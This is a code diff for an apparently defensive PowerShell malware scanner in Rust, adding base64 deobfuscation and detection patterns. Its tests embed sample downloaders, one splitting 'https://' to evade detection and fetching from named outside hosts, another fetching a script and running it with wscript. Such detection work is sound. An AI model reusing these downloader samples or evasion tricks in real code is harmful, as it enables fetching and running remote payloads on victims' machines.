@@ -939,6 +939,17 @@ static PS_LONG_B64_VAR_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
 });
 
 #[allow(clippy::expect_used)]
+static DAMAGED_PS_B64_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(r#"(?is)['"]([A-Za-z0-9+/=#\s]{80,})['"]"#).expect("damaged ps b64 literal regex")
+});
+
+#[allow(clippy::expect_used)]
+static PS_SIMPLE_REPLACE_CALL_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(r#"(?is)replace\s*\(\s*['"]([^'"]{1,16})['"]\s*,\s*['"]([^'"]{0,16})['"]\s*\)"#)
+        .expect("simple replace call regex")
+});
+
+#[allow(clippy::expect_used)]
 static PS_FUNCTION_DEF_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(r#"(?i)\bfunction\s+([A-Za-z_][A-Za-z0-9_]*)\b"#).expect("ps function def regex")
 });
@@ -4273,6 +4284,64 @@ fn looks_like_powershell_payload(bytes: &[u8]) -> bool {
         || lower.contains("iex ")
         || lower.contains("http://")
         || lower.contains("https://")
+        || lower.contains("tps://")
+}
+
+fn extract_damaged_inline_ps_base64_payloads(text: &str) -> Vec<Vec<u8>> {
+    let compact: String = text
+        .chars()
+        .filter(|ch| !ch.is_control() || ch.is_ascii_whitespace())
+        .collect();
+    let lower = compact.to_ascii_lowercase();
+    if !lower.contains("iex")
+        && !lower.contains("hell")
+        && !lower.contains("fromba")
+        && !lower.contains("getstring")
+    {
+        return Vec::new();
+    }
+
+    let replacements: Vec<(String, String)> = PS_SIMPLE_REPLACE_CALL_RE
+        .captures_iter(&compact)
+        .filter_map(|caps| {
+            Some((
+                caps.get(1)?.as_str().to_string(),
+                caps.get(2)?.as_str().to_string(),
+            ))
+        })
+        .take(8)
+        .collect();
+    let mut seen = std::collections::HashSet::new();
+    let mut out = Vec::new();
+
+    for caps in DAMAGED_PS_B64_LITERAL_RE.captures_iter(&compact).take(32) {
+        let Some(raw) = caps.get(1).map(|m| m.as_str()) else {
+            continue;
+        };
+        let mut candidate: String = raw.chars().filter(|ch| !ch.is_ascii_whitespace()).collect();
+        for (needle, replacement) in &replacements {
+            candidate = candidate.replace(needle, replacement);
+        }
+        if candidate.len() > 2 * 1024 * 1024
+            || !candidate
+                .chars()
+                .all(|ch| ch.is_ascii_alphanumeric() || matches!(ch, '+' | '/' | '='))
+        {
+            continue;
+        }
+        let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(candidate.as_bytes())
+        else {
+            continue;
+        };
+        if decoded.len() > 12 * 1024 * 1024 || !looks_like_powershell_payload(&decoded) {
+            continue;
+        }
+        if seen.insert(decoded.clone()) {
+            out.push(decoded);
+        }
+    }
+
+    out
 }
 
 fn is_utf16le(bytes: &[u8]) -> bool {
@@ -4788,6 +4857,41 @@ mod herestring_iex_tests {
     }
 
     #[test]
+    fn ps1_string_concat_array_urls_are_extracted() {
+        let payload = br#"
+            function DownloadDataFromLinks { param ([string[]]$links)
+                $webClient = New-Object System.Net.WebClient
+                foreach ($link in $links) { $webClient.DownloadData($link) }
+            }
+            $Bytes = 'ht';
+            $Bytes2 = 'tps://';
+            $base = $Bytes + $Bytes2;
+            $links = @(($base + 'nanshiin.com/1.jpg'), ($base + 'paste.sensio.no/ArlenDenial'));
+            DownloadDataFromLinks $links
+        "#
+        .to_vec();
+        let mut env = crate::env::Environment::new(&crate::env::Config::default());
+        env.all_extracted_ps1.push(payload);
+
+        scan_ps1_payloads(&mut env);
+
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(t, crate::traits::Trait::Download { src, .. } if src == "https://nanshiin.com/1.jpg")
+            }),
+            "nanshiin URL was not extracted: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(t, crate::traits::Trait::Download { src, .. } if src == "https://paste.sensio.no/ArlenDenial")
+            }),
+            "paste URL was not extracted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn ps1_downloaded_js_wscript_execution_emits_url_argument() {
         let payload = br#"IWR -useb 'https://script-host.example/payload.js' -outf $env:tmp\\payload.js; wscript $env:tmp\\payload.js"#.to_vec();
         let mut env = crate::env::Environment::new(&crate::env::Config::default());
@@ -5229,6 +5333,7 @@ fn ps1_payload_has_download_signal(text: &str) -> bool {
         b"get-history",
         b"runspace",
         b"function",
+        b"tps://",
     ];
 
     ATOMS
@@ -5374,10 +5479,11 @@ fn is_schemeless_ip_url(url: &str) -> bool {
 }
 
 pub fn scan_inline_powershell_text(text: &str, env: &mut Environment) {
-    if !inline_powershell_text_has_payload_signal(text) {
+    let damaged_payloads = extract_damaged_inline_ps_base64_payloads(text);
+    let has_inline_signal = inline_powershell_text_has_payload_signal(text);
+    if !has_inline_signal && damaged_payloads.is_empty() {
         return;
     }
-    let scan_text = inline_powershell_scan_text(text);
     let known_downloads: std::collections::HashSet<String> = env
         .traits
         .iter()
@@ -5398,9 +5504,13 @@ pub fn scan_inline_powershell_text(text: &str, env: &mut Environment) {
         max_traits_per_kind: 100,
     });
     payload_env.ps1_scan_cache_normalized = false;
-    payload_env
-        .all_extracted_ps1
-        .push(scan_text.as_bytes().to_vec());
+    if has_inline_signal {
+        let scan_text = inline_powershell_scan_text(text);
+        payload_env
+            .all_extracted_ps1
+            .push(scan_text.as_bytes().to_vec());
+    }
+    payload_env.all_extracted_ps1.extend(damaged_payloads);
     scan_ps1_payloads(&mut payload_env);
     env.traits
         .extend(payload_env.traits.into_iter().filter(|t| match t {
